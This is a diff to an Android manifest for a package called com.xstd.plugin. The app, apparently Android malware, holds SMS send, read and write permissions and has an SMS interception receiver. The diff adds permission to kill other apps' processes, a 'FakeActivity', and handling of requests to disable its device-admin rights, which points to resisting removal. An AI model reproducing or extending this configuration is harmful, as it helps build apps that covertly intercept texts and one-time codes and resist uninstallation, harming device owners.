@@ -17,6 +17,8 @@
     <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
 
     <application
         android:icon="@drawable/ic_launcher"
@@ -31,6 +33,7 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+        <activity android:name=".FakeActivity"/>
 
         <receiver
             android:name="com.xstd.plugin.receiver.ScreenBRC"
@@ -48,19 +51,20 @@
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
                 <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
             </intent-filter>
 
         </receiver>
-        <receiver
-            android:name="com.xstd.plugin.receiver.PackageInstallBRC"
-            android:priority="0x7fffffff">
-            <intent-filter>
-                <action android:name="android.intent.action.PACKAGE_ADDED"/>
-                <action android:name="android.intent.action.USER_PRESENT"/>
+        <!--<receiver-->
+            <!--android:name="com.xstd.plugin.receiver.PackageInstallBRC"-->
+            <!--android:priority="0x7fffffff">-->
+            <!--<intent-filter>-->
+                <!--&lt;!&ndash;<action android:name="android.intent.action.PACKAGE_ADDED"/>&ndash;&gt;-->
+                <!--<action android:name="android.intent.action.USER_PRESENT"/>-->
 
-                <data android:scheme="package"/>
-            </intent-filter>
-        </receiver>
+                <!--&lt;!&ndash;<data android:scheme="package"/>&ndash;&gt;-->
+            <!--</intent-filter>-->
+        <!--</receiver>-->
         <receiver
             android:name="com.xstd.plugin.receiver.PrivateSMSBRC"
             android:permission="android.permission.BROADCAST_SMS">
